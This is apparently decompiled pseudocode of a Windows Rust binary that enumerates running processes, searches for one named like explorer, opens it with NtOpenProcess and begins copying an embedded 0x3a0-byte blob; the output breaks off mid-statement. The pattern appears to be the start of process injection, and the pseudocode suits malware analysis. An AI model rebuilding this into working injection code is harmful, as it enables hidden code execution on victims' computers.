sym._ZN108__LT_core..iter..adapters..filter..Filter_LT_I_C_P_GT__u20_as_u20_core..iter..traits..iterator..Iterator_GT_4next17hb174\n                                   (&pauStack1384);\n                if (iVar14 == 0) {\n                    arg1 = 0x8;\n                    piVar41 = NULL;\n                }\n                else {\n                    pauVar26 = 0x8;\n                    arg1 = sym._ZN63__LT_alloc..alloc..Global_u20_as_u20_core..alloc..Allocator_GT_8allocate17h329e772386956f35E.350\n                                     (0x40, 8);\n                    if (arg1 == NULL) {\n                        iVar14 = 0x40;\n                        goto code_r0x004044cf;\n                    }\n                    *arg1 = iVar14;\n                    arg1[1] = pcVar27;\n                    pauStack1304 = pauStack1368;\n                    pauStack1320 = pauStack1384;\n                    pauStack1312 = pauStack1376;\n                    piVar44 = 0x1;\n                    piVar41 = 0x4;\n                    iVar14 = 0x18;\n                    pcVar27 = pauVar26;\n                    while (iVar34 = sym._ZN108__LT_core..iter..adapters..filter..Filter_LT_I_C_P_GT__u20_as_u20_core..iter..traits..iterator..Iterator_GT_4next17hb174\n                                              (&pauStack1320),  iVar34 != 0) {\n                        pauVar26 = pcVar27;\n                        if (piVar44 == piVar41) {\n                            piVar38 = piVar41 + 1;\n                            if (piVar38 == NULL) {\n                                pauVar26 = NULL;\n                                unique0x10005367 = piVar38;\n                            }\n                            else {\n                                if (piVar38 < piVar41 * 2) {\n                                    piVar38 = piVar41 * 2;\n                                }\n                                if (piVar38 < 0x5) {\n                                    piVar38 = 0x4;\n                                }\n                                if (piVar41 == NULL) {\n                                    uVar15 = 0;\n                                }\n                                else {\n                                    _auStack1192 = CONCAT88(piVar41 * 0x10, arg1);\n                                    uVar15 = 8;\n                                }\n                                _auStack1176 = CONCAT88(stack0xfffffffffffffb70, uVar15);\n                                sym.alloc::raw_vec::finish_grow::haea89cfef0f1116c\n                                          (auStack904, SUB168(ZEXT816(piVar38) * ZEXT816(0x10), 0), \n                                           (SUB168(ZEXT816(piVar38) * ZEXT816(0x10) >> 0x40, 0) == 0) << 3, auStack1192)\n                                ;\n                                pauVar26 = pauStack888;\n                                if (auStack904._0_8_ == 0) {\n                                    pauVar26 = 0x8000000000000001;\n                                    arg1 = stack0xfffffffffffffc80;\n                                    unique0x1000536f = piVar38;\n                                    piVar41 = piVar38;\n                                }\n                            }\n                            sym._ZN5alloc7raw_vec14handle_reserve17h5bdf8892013f3606E.348(*0x38, pauVar26);\n                        }\n                        *(arg1 + iVar14 + -8) = iVar34;\n                        *(arg1 + iVar14) = pcVar27;\n                        piVar44 = piVar44 + 1;\n                        iVar14 = iVar14 + 0x10;\n                        pcVar27 = pauVar26;\n                    }\n                }\n                piVar38 = arg1;\ncode_r0x004023c0:\n                piVar20 = piVar44;\ncode_r0x004023c3:\n                piVar33 = piVar38;\n                if (piVar20 != NULL) goto code_r0x004023cc;\n                uStack920 = pcVar27;\n                if (piVar41 != NULL) {\n                    uStack920 = SUB168(ZEXT816(piVar41) * ZEXT816(0x10) >> 0x40, 0);\n                    pauVar26 = SUB168(ZEXT816(piVar41) * ZEXT816(0x10), 0);\n                    if (uStack920 == NULL) {\n                        sym._ZN63__LT_alloc..alloc..Global_u20_as_u20_core..alloc..Allocator_GT_10deallocate17h82f390f816a480d0E.347\n                                  (arg1, pauVar26, 8);\n                        uStack920 = pauVar26;\n                    }\n                }\n                sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h4a7ca73887d5e132(&pauStack1216);\n                pauStack928 = sym.alloc::raw_vec::RawVec_T_A_::allocate_in::he8311ff590a9cc21(9);\n                ppauVar29 = &pauStack928;\n                **pauStack928 = str.ProcessorSystem._0_8_;\n                (*pauStack928)[8] = str.ProcessorSystem[8];\n                pauStack912 = 0x9;\n                sym.sysinfo::windows::tools::get_translation::hb7b771c7086657b5(&pauStack1216, ppauVar29, &uStack1480);\n                if (pauStack1216 != NULL) {\n                    pauStack1400 = pauStack1200;\n                    pauStack1416 = pauStack1216;\n                    uStack1408 = pcStack1208;\n                    puVar21 = sym.alloc::raw_vec::RawVec_T_A_::allocate_in::he8311ff590a9cc21(0x10);\n                    uVar10 = *0x44c2ad;\n                    uVar9 = *0x44c2a9;\n                    uVar8 = *0x44c2a5;\n                    _auStack1192 = CONCAT88(ppauVar29, puVar21);\n                    *puVar21 = *0x44c2a1;\n                    puVar21[1] = uVar8;\n                    puVar21[2] = uVar9;\n                    puVar21[3] = uVar10;\n                    _auStack1176 = CONCAT88(stack0xfffffffffffffb70, 0x10);\n                    ppauVar29 = auStack1192;\n                    sym.sysinfo::windows::tools::get_translation::hb7b771c7086657b5\n                              (&pauStack1384, auStack1192, &uStack1480);\n                    sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h4a7ca73887d5e132(auStack1192);\n                    if (pauStack1384 != NULL) {\n                        pauStack888 = &pauStack1272;\n                        _auStack904 = CONCAT88(0x43e43e, &pauStack1416);\n                        puVar31 = auStack1192;\n                        _auStack1192 = 0x44c2c0;\n                        uStack1184 = 0x2;\n                        _auStack1176 = _auStack1176 & 0xffffffffffffffff;\n                        pcStack880 = sym._T_as_core::fmt::Display_::fmt::ha1fa84016a26224a;\n                        auStack1160 = CONCAT88(2, auStack904);\n                        pauStack1272 = &pauStack1384;\n                        sym.alloc::fmt::format::h5ed3f0bbcb495c5a(&pauStack1320, puVar31);\n                        puVar21 = sym.alloc::raw_vec::RawVec_T_A_::allocate_in::he8311ff590a9cc21(5);\n                        _auStack1192 = CONCAT88(puVar31, puVar21);\n                        *puVar21 = str.tot_0__._0_4_;\n                        *(puVar21 + 1) = str.tot_0__[4];\n                        _auStack1176 = CONCAT88(stack0xfffffffffffffb70, 5);\n                        ppauVar29 = &pauStack296;\n                        sym.sysinfo::windows::tools::add_counter::h627aa94b91232368\n                                  (&pauStack1320, ppauVar29, auStack480, auStack1192);\n                    }\n                    uVar25 = pauStack352 & 0x1fffffffffffffff;\n                    iVar14 = CONCAT44(uStack364, uStack368) + 0x18;\n                    for (uVar35 = 0; uVar25 != uVar35; uVar35 = uVar35 + 1) {\n                        uStack936 = uVar35;\n                        if (pauStack1384 != NULL) {\n                            _auStack1192 = &pauStack1416;\n                            uStack1184 = \n                            sym._ZN60__LT_alloc..string..String_u20_as_u20_core..fmt..Display_GT_3fmt17ha73f94b165f2af7bE.368\n                            ;\n                            stack0xfffffffffffffb70 =\n                                 sym.core::fmt::num::imp::__impl_core::fmt::Display_for_u64_::fmt::hbcabcdd33be495c5;\n                            _auStack904 = CONCAT88(3, 0x44c2e8);\n                            pauStack888 = NULL;\n                            auStack1160._0_8_ = &pauStack1352;\n                            auStack1160._8_8_ = sym._T_as_core::fmt::Display_::fmt::ha1fa84016a26224a;\n                            uStack864 = 3;\n                            pauStack1352 = &pauStack1384;\n                            pauStack872 = auStack1192;\n                            auStack1176._0_8_ = &uStack936;\n                            sym.alloc::fmt::format::h5ed3f0bbcb495c5a(&pauStack1320, auStack904);\n                            _auStack1192 = CONCAT88(2, 0x44c320);\n                            _auStack1176 = ZEXT816(stack0xfffffffffffffb70) << 0x40;\n                            pcStack1264 = \n                            sym.core::fmt::num::imp::__impl_core::fmt::Display_for_u64_::fmt::hbcabcdd33be495c5;\n                            auStack1160 = CONCAT88(1, &pauStack1272);\n                            pauStack1272 = &uStack936;\n                            sym.alloc::fmt::format::h5ed3f0bbcb495c5a(auStack904, auStack1192);\n                            ppauVar29 = &pauStack296;\n                            sym.sysinfo::windows::tools::add_counter::h627aa94b91232368\n                                      (&pauStack1320, ppauVar29, iVar14, auStack904);\n                        }\n                        iVar14 = iVar14 + 0x88;\n                    }\n                    sym.core::ptr::drop_in_place_core::option::Option_alloc::string::String__::h84ebf13874ce3e56\n                              (&pauStack1384);\n                    sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h4a7ca73887d5e132(&pauStack1416);\n                }\n                if (uStack1464 != 0) {\n                    if (auStack1448._8_8_ != 0) {\n                        auVar5 = *pauStack1456;\n                        uVar23 = ~(SUB161(auVar5 >> 7, 0) & 1 | (SUB161(auVar5 >> 0xf, 0) & 1) << 1 |\n                                   (SUB161(auVar5 >> 0x17, 0) & 1) << 2 | (SUB161(auVar5 >> 0x1f, 0) & 1) << 3 |\n                                   (SUB161(auVar5 >> 0x27, 0) & 1) << 4 | (SUB161(auVar5 >> 0x2f, 0) & 1) << 5 |\n                                   (SUB161(auVar5 >> 0x37, 0) & 1) << 6 | (SUB161(auVar5 >> 0x3f, 0) & 1) << 7 |\n                                   (SUB161(auVar5 >> 0x47, 0) & 1) << 8 | (SUB161(auVar5 >> 0x4f, 0) & 1) << 9 |\n                                   (SUB161(auVar5 >> 0x57, 0) & 1) << 10 | (SUB161(auVar5 >> 0x5f, 0) & 1) << 0xb |\n                                   (SUB161(auVar5 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar5 >> 0x6f, 0) & 1) << 0xd |\n                                   (SUB161(auVar5 >> 0x77, 0) & 1) << 0xe | SUB161(auVar5 >> 0x7f, 0) << 0xf);\n                        pauVar26 = pauStack1456[1];\n                        pauVar19 = pauStack1456;\n                        while (bVar45 = auStack1448._8_8_ != 0,  auStack1448._8_8_ = auStack1448._8_8_ + -1, \n                              ppauVar28 = ppauVar29,  bVar45) {\n                            while (iVar14 = sym._ZN9hashbrown3raw7bitmask7BitMask14lowest_set_bit17h28cf3cd6f34533baE.362\n                                                      (uVar23),  iVar14 != 1) {\n                                auVar5 = *pauVar26;\n                                uVar23 = ~(SUB161(auVar5 >> 7, 0) & 1 | (SUB161(auVar5 >> 0xf, 0) & 1) << 1 |\n                                           (SUB161(auVar5 >> 0x17, 0) & 1) << 2 | (SUB161(auVar5 >> 0x1f, 0) & 1) << 3 |\n                                           (SUB161(auVar5 >> 0x27, 0) & 1) << 4 | (SUB161(auVar5 >> 0x2f, 0) & 1) << 5 |\n                                           (SUB161(auVar5 >> 0x37, 0) & 1) << 6 | (SUB161(auVar5 >> 0x3f, 0) & 1) << 7 |\n                                           (SUB161(auVar5 >> 0x47, 0) & 1) << 8 | (SUB161(auVar5 >> 0x4f, 0) & 1) << 9 |\n                                           (SUB161(auVar5 >> 0x57, 0) & 1) << 10 |\n                                           (SUB161(auVar5 >> 0x5f, 0) & 1) << 0xb |\n                                           (SUB161(auVar5 >> 0x67, 0) & 1) << 0xc |\n                                           (SUB161(auVar5 >> 0x6f, 0) & 1) << 0xd |\n                                           (SUB161(auVar5 >> 0x77, 0) & 1) << 0xe | SUB161(auVar5 >> 0x7f, 0) << 0xf);\n                                pauVar19 = pauVar19[-0x20];\n                                pauVar26 = pauVar26[1];\n                            }\n                            uVar23 = uVar23 - 1 & uVar23;\n                            ppauVar29 = ppauVar28 * 0x20;\n                            sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h4a7ca73887d5e132\n                                      (pauVar19[ppauVar28 * -2 + -2]);\n                        }\n                    }\n                    sym.hashbrown::raw::RawTableInner_A_::free_buckets::h4e92ad8948d9d1b4(&uStack1464, 0x20);\n                }\n                sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h4a7ca73887d5e132(&pauStack928);\n            }\n            iVar14 = 8;\n            sym._sysinfo::windows::system::System_as_sysinfo::traits::SystemExt_::refresh_memory::h5e91b5c3dbad9693\n                      (&pauStack584);\n            sym._sysinfo::windows::system::System_as_sysinfo::traits::SystemExt_::refresh_cpu::hfbdaaaae82ff89f1\n                      (&pauStack584);\n            sym.sysinfo::traits::SystemExt::refresh_components::hb5bc10e6d4e85c88(&pauStack584);\n            sym._sysinfo::windows::system::System_as_sysinfo::traits::SystemExt_::refresh_processes::h1990fecb0cd854ab\n                      (&pauStack584);\n            sym.sysinfo::traits::SystemExt::refresh_disks::heda9abf213da9071(&pauStack584);\n            sym._sysinfo::windows::network::Networks_as_sysinfo::traits::NetworksExt_::refresh::hb08886f124f0ebed\n                      (&uStack232);\n            uStack1480 = 8;\n            uStack1476 = 0;\n            uStack1464 = SUB168(CONCAT412(uVar49, CONCAT48(uVar48, CONCAT44(uVar47, uVar46))) >> 0x40, 0);\n            pauStack888 = *pauStack568 + 1 + pauStack560;\n            auVar5 = *pauStack560;\n            _auStack904 = CONCAT88(pauStack560[1], pauStack560);\n            pcStack880 = pcStack880 & 0xffffffffffff0000 |\n                         ~(SUB161(auVar5 >> 7, 0) & 1 | (SUB161(auVar5 >> 0xf, 0) & 1) << 1 |\n                           (SUB161(auVar5 >> 0x17, 0) & 1) << 2 | (SUB161(auVar5 >> 0x1f, 0) & 1) << 3 |\n                           (SUB161(auVar5 >> 0x27, 0) & 1) << 4 | (SUB161(auVar5 >> 0x2f, 0) & 1) << 5 |\n                           (SUB161(auVar5 >> 0x37, 0) & 1) << 6 | (SUB161(auVar5 >> 0x3f, 0) & 1) << 7 |\n                           (SUB161(auVar5 >> 0x47, 0) & 1) << 8 | (SUB161(auVar5 >> 0x4f, 0) & 1) << 9 |\n                           (SUB161(auVar5 >> 0x57, 0) & 1) << 10 | (SUB161(auVar5 >> 0x5f, 0) & 1) << 0xb |\n                           (SUB161(auVar5 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar5 >> 0x6f, 0) & 1) << 0xd |\n                           (SUB161(auVar5 >> 0x77, 0) & 1) << 0xe | SUB161(auVar5 >> 0x7f, 0) << 0xf);\n            pauStack872 = pauStack544;\n            uVar25 = 0;\n            uStack1472 = uVar46;\n            uStack1468 = uVar47;\ncode_r0x00402c56:\n            pauVar19 = sym._hashbrown::raw::RawIter_T__as_core::iter::traits::iterator::Iterator_::next::h3b916558db69be83\n                                 (auStack904);\n            if (pauVar19 != NULL) {\n                dbg.new(auStack1192, *pauVar19[-0x11], *pauVar19[-0x10], \"explorermist\\n\");\n                if (auStack1160._0_8_ != NULL) {\n                    pauStack1392 = stack0xfffffffffffffb70 - uStack1136;\n                    pauVar26 = pauStack1104;\n                    puVar31 = puStack1120;\ncode_r0x00402d24:\n                    do {\n                        pauVar16 = pauVar26;\n                        if (pauVar26 < auStack1160._8_8_) {\n                            pauVar16 = auStack1160._8_8_;\n                        }\n                        if (pauStack1104 == 0xffffffffffffffff) {\n                            pauVar16 = auStack1160._8_8_;\n                        }\n                        pauVar17 = NULL;\n                        if (pauStack1104 != 0xffffffffffffffff) {\n                            pauVar17 = pauVar26;\n                        }\ncode_r0x00402d40:\n                        do {\n                            while( true ) {\n                                pauStack1424 = pauVar19;\n                                if (uStack1184 <= puVar31 + stack0xfffffffffffffb70 + -1) goto code_r0x00402c56;\n                                if ((pauStack1128 >> ((*(puVar31 + stack0xfffffffffffffb70 + -1))[_auStack1192] & 0x3f)\n                                    & 1) == 0) break;\n                                pauVar26 = pauVar16;\n                                do {\n                                    pauVar18 = auStack1160._8_8_;\n                                    if (stack0xfffffffffffffb70 <= pauVar26) goto code_r0x00402da7;\n                                    if (uStack1184 <= puVar31 + pauVar26) {\n                                        pauVar26 = puVar31 + *pauVar16;\n                                        if (puVar31 + *pauVar16 < uStack1184) {\n                                            pauVar26 = uStack1184;\n                                        }\n                                        uVar15 = 0x4496c8;\n                                        unique0x10005187 = uStack1184;\n                                        goto code_r0x004043e4;\n                                    }\n                                    pauVar18 = *pauVar26 + 1;\n                                    puVar6 = *pauVar26;\n                                    pcVar27 = puVar31 + _auStack1192 + pauVar26;\n                                    pauVar26 = pauVar18;\n                                } while (puVar6[auStack1176._0_8_] == *pcVar27);\n                                iVar34 = puVar31 - auStack1160._8_8_;\n                                puVar31 = iVar34 + pauVar18;\n                                if (pauStack1104 != 0xffffffffffffffff) {\n                                    puVar31 = iVar34 + pauVar18;\n                                    pauVar26 = NULL;\n                                    goto code_r0x00402d24;\n                                }\n                            }\n                            puVar31 = puVar31 + stack0xfffffffffffffb70;\n                        } while (pauStack1104 == 0xffffffffffffffff);\n                        pauVar26 = NULL;\n                    } while( true );\n                }\n                uVar35 = uStack1136 & 0xff;\n                while (uStack1136._2_1_ == '\\0') {\n                    if (auStack1160._8_8_ != NULL) {\n                        if (auStack1160._8_8_ < uStack1184) {\n                            if (auStack1160._8_8_[_auStack1192] < -0x40) {\ncode_r0x00404437:\n                                dbg.slice_error_fail(_auStack1192, uStack1184, auStack1160._8_8_, uStack1184);\n                                do {\n                                    invalidInstructionException();\n                                } while( true );\n                            }\n                        }\n                        else if (uStack1184 != auStack1160._8_8_) goto code_r0x00404437;\n                    }\n                    if (auStack1160._8_8_ == uStack1184) {\n                        if (uVar35 != '\\0') {\ncode_r0x00402e12:\n                            if (uVar25 == CONCAT44(uStack1468, uStack1472)) {\n                                sym.alloc::raw_vec::RawVec_T_A_::reserve_for_push::hd973d379aa2a4e99\n                                          (&uStack1480, uVar25);\n                                iVar14 = CONCAT44(uStack1476, uStack1480);\n                                uVar25 = uStack1464;\n                            }\n                            *(iVar14 + uVar25 * 8) = pauVar19[-0x11];\n                            uVar25 = uStack1464 + 1;\n                            uStack1464 = uVar25;\n                        }\n                        break;\n                    }\n                    uVar11 = auStack1160._8_8_[_auStack1192];\n                    uVar46 = uVar11;\n                    if (uVar11 < '\\0') {\n                        uVar23 = uVar11 & 0x1f;\n                        uVar46 = auStack1160._8_8_[*_auStack1192 + 1] & 0x3f;\n                        if (uVar11 < 0xe0) {\n                            uVar46 = uVar23 << 6 | uVar46;\n                        }\n                        else {\n                            uVar46 = auStack1160._8_8_[*_auStack1192 + 2] & 0x3f | uVar46 << 6;\n                            if (uVar11 < 0xf0) {\n                                uVar46 = uVar46 | uVar23 << 0xc;\n                            }\n                            else {\n                                uVar46 = auStack1160._8_8_[*_auStack1192 + 3] & 0x3f | uVar46 << 6 |\n                                         (uVar11 & 7) << 0x12;\n                            }\n                        }\n                    }\n                    if (uVar35 != '\\0') goto code_r0x00402e12;\n                    if (uVar46 == 0x110000) break;\n                    iVar34 = 1;\n                    if ((0x7f < uVar46) && (iVar34 = 2,  0x7ff < uVar46)) {\n                        iVar34 = 4 - (uVar46 < 0x10000);\n                    }\n                    auStack1160._8_8_ = auStack1160._8_8_ + iVar34;\n                    uVar35 = 1;\n                }\n                goto code_r0x00402c56;\n            }\n            pauVar26 = NULL;\n            for (iVar14 = 0;\n                (uVar25 * 8 != iVar14 && (iVar34 = *(CONCAT44(uStack1476, uStack1480) + iVar14),  iVar34 != 0));\n                iVar14 = iVar14 + 8) {\n                pauVar26 = *(iVar34 + 0x48);\n            }\n            if ((CONCAT44(uStack1468, uStack1472) != 0) &&\n               (auVar5 = ZEXT816(CONCAT44(uStack1468, uStack1472)) * ZEXT816(8),  SUB168(auVar5 >> 0x40, 0) == 0)) {\n                sym._alloc::alloc::Global_as_core::alloc::Allocator_::deallocate::h82f390f816a480d0\n                          (CONCAT44(uStack1476, uStack1480), SUB168(auVar5, 0), 8);\n            }\n            if (pauStack568 != NULL) {\n                if (pauStack544 != NULL) {\n                    auVar5 = *pauStack560;\n                    _auStack1192 = CONCAT88(pauStack560[1], pauStack560);\n                    auStack1176 = CONCAT28(~(SUB161(auVar5 >> 7, 0) & 1 | (SUB161(auVar5 >> 0xf, 0) & 1) << 1 |\n                                             (SUB161(auVar5 >> 0x17, 0) & 1) << 2 | (SUB161(auVar5 >> 0x1f, 0) & 1) << 3\n                                             | (SUB161(auVar5 >> 0x27, 0) & 1) << 4 |\n                                             (SUB161(auVar5 >> 0x2f, 0) & 1) << 5 | (SUB161(auVar5 >> 0x37, 0) & 1) << 6\n                                             | (SUB161(auVar5 >> 0x3f, 0) & 1) << 7 |\n                                             (SUB161(auVar5 >> 0x47, 0) & 1) << 8 | (SUB161(auVar5 >> 0x4f, 0) & 1) << 9\n                                             | (SUB161(auVar5 >> 0x57, 0) & 1) << 10 |\n                                             (SUB161(auVar5 >> 0x5f, 0) & 1) << 0xb |\n                                             (SUB161(auVar5 >> 0x67, 0) & 1) << 0xc |\n                                             (SUB161(auVar5 >> 0x6f, 0) & 1) << 0xd |\n                                             (SUB161(auVar5 >> 0x77, 0) & 1) << 0xe | SUB161(auVar5 >> 0x7f, 0) << 0xf)\n                                           , *pauStack560 + *pauStack568 + 1);\n                    auStack1160 = CONCAT88(auStack1160._8_8_, pauStack544);\n                    while (iVar14 = sym._hashbrown::raw::RawIter_T__as_core::iter::traits::iterator::Iterator_::next::h3b916558db69be83\n                                              (auStack1192),  iVar14 != 0) {\n                        sym.core::ptr::drop_in_place_sysinfo::windows::process::Process_::he2d436bb30ee18b4\n                                  (iVar14 + -0x110);\n                    }\n                }\n                sym.hashbrown::raw::RawTableInner_A_::free_buckets::hb6b8b7770b04fba1(&pauStack568, 0x118);\n            }\n            sym.core::ptr::drop_in_place_sysinfo::windows::processor::Processor_::h7f799a5f6dff1154(auStack504);\n            iVar14 = CONCAT44(uStack364, uStack368);\n            for (iVar34 = pauStack352 * 0x88; iVar34 != 0; iVar34 = iVar34 + -0x88) {\n                sym.core::ptr::drop_in_place_sysinfo::windows::processor::Processor_::h7f799a5f6dff1154(iVar14);\n                iVar14 = iVar14 + 0x88;\n            }\n            if ((CONCAT44(uStack356, uStack360) != 0) &&\n               (auVar5 = ZEXT816(CONCAT44(uStack356, uStack360)) * ZEXT816(0x88),  SUB168(auVar5 >> 0x40, 0) == 0)) {\n                sym._alloc::alloc::Global_as_core::alloc::Allocator_::deallocate::h82f390f816a480d0\n                          (CONCAT44(uStack364, uStack368), SUB168(auVar5, 0), 8);\n            }\n            sym._alloc::vec::Vec_T_A__as_core::ops::drop::Drop_::drop::h2ae975c1214e7a77(&uStack344);\n            sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h0a0da871ee2f971f(&uStack344);\n            sym._alloc::vec::Vec_T_A__as_core::ops::drop::Drop_::drop::hde581309b9f37576(&uStack320);\n            sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::he1aa6ecab13b4b4f(&uStack320);\n            if (pauStack256 != NULL) {\n                auVar5 = *pauStack256;\n                _auStack1192 = CONCAT88(pauStack256[1], pauStack256);\n                auStack1176 = CONCAT28(~(SUB161(auVar5 >> 7, 0) & 1 | (SUB161(auVar5 >> 0xf, 0) & 1) << 1 |\n                                         (SUB161(auVar5 >> 0x17, 0) & 1) << 2 | (SUB161(auVar5 >> 0x1f, 0) & 1) << 3 |\n                                         (SUB161(auVar5 >> 0x27, 0) & 1) << 4 | (SUB161(auVar5 >> 0x2f, 0) & 1) << 5 |\n                                         (SUB161(auVar5 >> 0x37, 0) & 1) << 6 | (SUB161(auVar5 >> 0x3f, 0) & 1) << 7 |\n                                         (SUB161(auVar5 >> 0x47, 0) & 1) << 8 | (SUB161(auVar5 >> 0x4f, 0) & 1) << 9 |\n                                         (SUB161(auVar5 >> 0x57, 0) & 1) << 10 | (SUB161(auVar5 >> 0x5f, 0) & 1) << 0xb\n                                         | (SUB161(auVar5 >> 0x67, 0) & 1) << 0xc |\n                                         (SUB161(auVar5 >> 0x6f, 0) & 1) << 0xd | (SUB161(auVar5 >> 0x77, 0) & 1) << 0xe\n                                        | SUB161(auVar5 >> 0x7f, 0) << 0xf), *pauStack256 + iStack264 + 1);\n                auStack1160 = CONCAT88(auStack1160._8_8_, iStack240);\n                while (iVar14 = sym._hashbrown::raw::RawIter_T__as_core::iter::traits::iterator::Iterator_::next::hfbf69c3e50282aef\n                                          (auStack1192),  iVar14 != 0) {\n                    sub.pdh.dll_PdhRemoveCounter(*(iVar14 + -8));\n                }\n                if (iStack288 != 0) {\n                    sub.KERNEL32.dll_CloseHandle();\n                }\n                if (pauStack296 != NULL) {\n                    sub.pdh.dll_PdhCloseQuery();\n                }\n                if (iStack264 != 0) {\n                    if (iStack240 != 0) {\n                        auVar5 = *pauStack256;\n                        _auStack1192 = CONCAT88(pauStack256[1], pauStack256);\n                        auStack1176 = CONCAT28(~(SUB161(auVar5 >> 7, 0) & 1 | (SUB161(auVar5 >> 0xf, 0) & 1) << 1 |\n                                                 (SUB161(auVar5 >> 0x17, 0) & 1) << 2 |\n                                                 (SUB161(auVar5 >> 0x1f, 0) & 1) << 3 |\n                                                 (SUB161(auVar5 >> 0x27, 0) & 1) << 4 |\n                                                 (SUB161(auVar5 >> 0x2f, 0) & 1) << 5 |\n                                                 (SUB161(auVar5 >> 0x37, 0) & 1) << 6 |\n                                                 (SUB161(auVar5 >> 0x3f, 0) & 1) << 7 |\n                                                 (SUB161(auVar5 >> 0x47, 0) & 1) << 8 |\n                                                 (SUB161(auVar5 >> 0x4f, 0) & 1) << 9 |\n                                                 (SUB161(auVar5 >> 0x57, 0) & 1) << 10 |\n                                                 (SUB161(auVar5 >> 0x5f, 0) & 1) << 0xb |\n                                                 (SUB161(auVar5 >> 0x67, 0) & 1) << 0xc |\n                                                 (SUB161(auVar5 >> 0x6f, 0) & 1) << 0xd |\n                                                 (SUB161(auVar5 >> 0x77, 0) & 1) << 0xe |\n                                                SUB161(auVar5 >> 0x7f, 0) << 0xf), *pauStack256 + iStack264 + 1);\n                        auStack1160 = CONCAT88(auStack1160._8_8_, iStack240);\n                        while (iVar14 = sym._hashbrown::raw::RawIter_T__as_core::iter::traits::iterator::Iterator_::next::hfbf69c3e50282aef\n                                                  (auStack1192),  iVar14 != 0) {\n                            sym.core::ptr::drop_in_place_alloc::vec::Vec_u8__::hdd548e486ecdcdb8(iVar14 + -0x20);\n                        }\n                    }\n                    sym.hashbrown::raw::RawTableInner_A_::free_buckets::hb6b8b7770b04fba1(&iStack264, 0x20);\n                }\n            }\n            if (iStack216 != 0) {\n                if (auStack200._8_8_ != 0) {\n                    auVar5 = *pauStack208;\n                    _auStack1192 = CONCAT88(pauStack208[1], pauStack208);\n                    auStack1176 = CONCAT28(~(SUB161(auVar5 >> 7, 0) & 1 | (SUB161(auVar5 >> 0xf, 0) & 1) << 1 |\n                                             (SUB161(auVar5 >> 0x17, 0) & 1) << 2 | (SUB161(auVar5 >> 0x1f, 0) & 1) << 3\n                                             | (SUB161(auVar5 >> 0x27, 0) & 1) << 4 |\n                                             (SUB161(auVar5 >> 0x2f, 0) & 1) << 5 | (SUB161(auVar5 >> 0x37, 0) & 1) << 6\n                                             | (SUB161(auVar5 >> 0x3f, 0) & 1) << 7 |\n                                             (SUB161(auVar5 >> 0x47, 0) & 1) << 8 | (SUB161(auVar5 >> 0x4f, 0) & 1) << 9\n                                             | (SUB161(auVar5 >> 0x57, 0) & 1) << 10 |\n                                             (SUB161(auVar5 >> 0x5f, 0) & 1) << 0xb |\n                                             (SUB161(auVar5 >> 0x67, 0) & 1) << 0xc |\n                                             (SUB161(auVar5 >> 0x6f, 0) & 1) << 0xd |\n                                             (SUB161(auVar5 >> 0x77, 0) & 1) << 0xe | SUB161(auVar5 >> 0x7f, 0) << 0xf)\n                                           , *pauStack208 + iStack216 + 1);\n                    auStack1160 = CONCAT88(auStack1160._8_8_, auStack200._8_8_);\n                    while (iVar14 = sym._hashbrown::raw::RawIter_T__as_core::iter::traits::iterator::Iterator_::next::h474d36004fb7062b\n                                              (auStack1192),  iVar14 != 0) {\n                        sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::h4a7ca73887d5e132\n                                  (iVar14 + -0x88);\n                    }\n                }\n                sym.hashbrown::raw::RawTableInner_A_::free_buckets::hb6b8b7770b04fba1(&iStack216, 0x88);\n            }\n            sym._alloc::vec::Vec_T_A__as_core::ops::drop::Drop_::drop::h90b2a9d036fee0ed(&uStack176);\n            sym._alloc::raw_vec::RawVec_T_A__as_core::ops::drop::Drop_::drop::hfecc47c580170072(&uStack176);\n            auStack1448._0_16_ = 0x0;\n            uStack1464 = 0;\n            pauStack1456 = NULL;\n            uStack1480 = 0;\n            uStack1476 = 0;\n            uStack1472 = 0;\n            uStack1468 = 0;\n            pauStack1376 = NULL;\n            pauStack1384 = pauVar26;\n            pauStack1272 = pauVar26;\n            uVar46 = sub.ntdll.dll_NtOpenProcess(0, &pauStack1272, 0x7f);\n            pauStack1352 = pauStack1352 & 0xffffffff00000000 | uVar46;\n            if (uVar46 < 0) {\n                _auStack1192 = &pauStack1352;\n                pauStack584 = 0x444610;\n                uStack1184 = sym.core::fmt::num::imp::__impl_core::fmt::Display_for_i32_::fmt::hff6e31fbf33ddf61;\n                uStack552 = auStack1192;\n                uVar15 = 0x444630;\ncode_r0x004045e9:\n                pauStack544 = 0x1;\n                pauStack568 = NULL;\n                uStack576 = 0x1;\n                dbg.panic_fmt(&pauStack584, uVar15);\n                do {\n                    invalidInstructionException();\n                } while( true );\n            }\n            pauVar19 = sym.__rust_alloc(0x3a0, 1);\n            uVar49 = *0x44400c;\n            uVar48 = *0x444008;\n            uVar47 = *0x444004;\n            if (pauVar19 != NULL) {\n                **pauVar19 = *0x444000;\n                *(*pauVar19 + 4) = uVar47;\n                *(*pauVar19 + 8) = uVar48;\n                *(*pauVar19 + 0xc) = uVar49;\n                uVar49 = *0x44401c;\n                uVar48 = *0x444018;\n                uVar47 = *0x444014;\n                *pauVar19[1] = *0x444010;\n                *(pauVar19[1] + 4) = uVar47;\n                *(pauVar19[1] + 8) = uVar48;\n                *(pauVar19[1] + 0xc) = uVar49;\n                uVar49 = *0x44402c;\n                uVar48 = *0x444028;\n                uVar47 = *0x444024;\n                *pauVar19[2] = *0x444020;\n                *(pauVar19[2] + 4) = uVar47;\n                *(pauVar19[2] + 8) = uVar48;\n                *(pauVar19[2] + 0xc) = uVar49;\n                uVar49 = str._bZpV._0_4_;\n                uVar48 = *0x444038;\n                uVar47 = *0x444034;\n                *pauVar19[3] = *0x444030;\n                *(pauVar19[3] + 4) = uVar47;\n                *(pauVar19[3] + 8) = uVar48;\n                *(pauVar19[3] + 0xc) = uVar49;\n                uVar49 = *0x44404c;\n                uVar48 = str.3Uie._0_4_;\n                uVar47 = *0x444044;\n                *pauVar19[4] = 